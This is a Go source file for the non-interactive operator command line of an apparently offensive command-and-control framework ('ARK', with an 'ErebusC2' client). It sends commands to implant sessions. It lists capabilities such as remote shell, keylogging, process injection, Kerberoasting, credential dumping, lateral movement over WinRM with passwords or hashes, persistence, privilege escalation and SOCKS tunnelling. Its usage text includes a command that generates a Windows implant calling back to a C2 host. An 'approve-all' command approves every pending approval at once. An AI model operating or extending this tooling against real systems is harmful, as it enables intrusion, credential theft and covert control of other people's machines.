package operatorcli

import (
	"fmt"
	"strings"

	pb "github.com/KKingZero/ARK/pkg/pb"
)

// sessionCommands need an implant session. One-shot `ark op` auto-picks
// the first alive session when --session is omitted.
var sessionCommands = map[string]struct{}{
	"shell": {}, "upload": {}, "download": {}, "ps": {}, "kill": {},
	"ifconfig": {}, "portscan": {}, "sleep": {}, "screenshot": {},
	"keylog": {}, "inject": {}, "ldap-enum": {}, "kerberoast": {},
	"asreproast": {}, "creds-dump": {}, "lateral": {}, "smb": {},
	"persist": {}, "privesc": {}, "cloud": {}, "socks": {},
}

// Exec runs one operator command non-interactively (ark op).
func Exec(opts Options, args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: ark op <command> [args]\n%s", opUsage)
	}
	cmd := strings.ToLower(args[0])
	rest := args[1:]
	if cmd == "help" || cmd == "-h" || cmd == "--help" {
		fmt.Print(opUsage)
		return nil
	}
	// Host-local: no teamserver / certs.
	if cmd == "inbound" {
		h := (&Commands{}).Handlers()["inbound"]
		return h(rest)
	}
	if cmd == "generate" {
		if _, err := parseGenerateArgs(rest); err != nil {
			return err
		}
	}

	client, conn, err := Connect(opts)
	if err != nil {
		return err
	}
	defer conn.Close()

	var approver pb.ErebusC2Client
	if opts.ApproverCertFile != "" && opts.ApproverKeyFile != "" {
		if ac, aconn, aerr := Connect(Options{
			Server:   opts.Server,
			CertFile: opts.ApproverCertFile,
			KeyFile:  opts.ApproverKeyFile,
			CAFile:   opts.CAFile,
		}); aerr == nil {
			defer aconn.Close()
			approver = ac
		} else if cmd == "approve" || cmd == "deny" || cmd == "pending" || cmd == "approve-all" {
			return fmt.Errorf("connect approver seat: %w", aerr)
		}
	}

	c := NewCommands(client, approver)
	session, rest := peelSessionFlag(rest)
	if session != "" {
		if err := c.cmdUse([]string{session}); err != nil {
			return err
		}
	} else if _, need := sessionCommands[cmd]; need {
		if err := c.useFirstAlive(); err != nil {
			return err
		}
	}

	if cmd == "approve-all" {
		return c.cmdApproveAll(nil)
	}

	h, ok := c.Handlers()[cmd]
	if !ok {
		if cmd == "replay-clear" || cmd == "clear-replay" {
			h, ok = c.Handlers()["replay-clear"]
		}
	}
	if !ok {
		return fmt.Errorf("unknown op command %q (try: ark op help)", cmd)
	}
	return h(rest)
}

func peelSessionFlag(args []string) (session string, rest []string) {
	out := make([]string, 0, len(args))
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--session", "-s":
			if i+1 < len(args) {
				session = args[i+1]
				i++
			}
		default:
			out = append(out, args[i])
		}
	}
	return session, out
}

func (c *Commands) useFirstAlive() error {
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListSessions(ctx, &pb.ListSessionsRequest{})
	if err != nil {
		return err
	}
	for _, s := range resp.Sessions {
		if s.Alive {
			return c.cmdUse([]string{s.SessionId})
		}
	}
	return fmt.Errorf("no alive session")
}

func (c *Commands) cmdApproveAll(_ []string) error {
	ctx, cancel := c.ctx()
	defer cancel()
	pend, err := c.approvalClient().ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
	if err != nil {
		return err
	}
	for _, a := range pend.Approvals {
		if _, err := c.approvalClient().Approve(ctx, &pb.ApproveRequest{ApprovalId: a.Id}); err != nil {
			fmt.Printf("approve %s failed: %v\n", a.Id, err)
			continue
		}
		fmt.Println("approved", a.Id)
	}
	return nil
}

func (c *Commands) cmdReplayClear(args []string) error {
	if len(args) < 1 || strings.TrimSpace(args[0]) == "" {
		return fmt.Errorf("usage: replay-clear <implant_id>")
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ClearReplay(ctx, &pb.ClearReplayRequest{ImplantId: strings.TrimSpace(args[0])})
	if err != nil {
		return err
	}
	if !resp.GetSuccess() {
		return fmt.Errorf("replay-clear: %s", resp.GetError())
	}
	fmt.Printf("replay-clear implant=%s cleared=%d\n", args[0], resp.GetCleared())
	return nil
}

const opUsage = `ark op — non-interactive operator commands (same handlers as the REPL)

  ark op sessions
  ark op pending
  ark op approve-all
  ark op shell [--session ID] <command...>
  ark op lateral winrm <target> <command> --user U --domain D (--pass P | --hash H)
  ark op generate --os windows --language c --transport https --callback https://C2:8443 --out implant.exe
  ark op register-secret <implant_id> <secret_hex> [build_id]
  ark op inbound [status|env|drop|through|close|tunnel]
  ark op socks start [--port 1080] [--session ID]
  ark op socks stop [--session ID]
  ark op replay-clear <implant_id>

Uses ~/.ark/certs/operator*.pem by default (except inbound).
Approval commands use ~/.ark/certs/approver*.pem unless overridden.
Flags (before subcommand): -server -cert -key -ca -approver-cert -approver-key
`
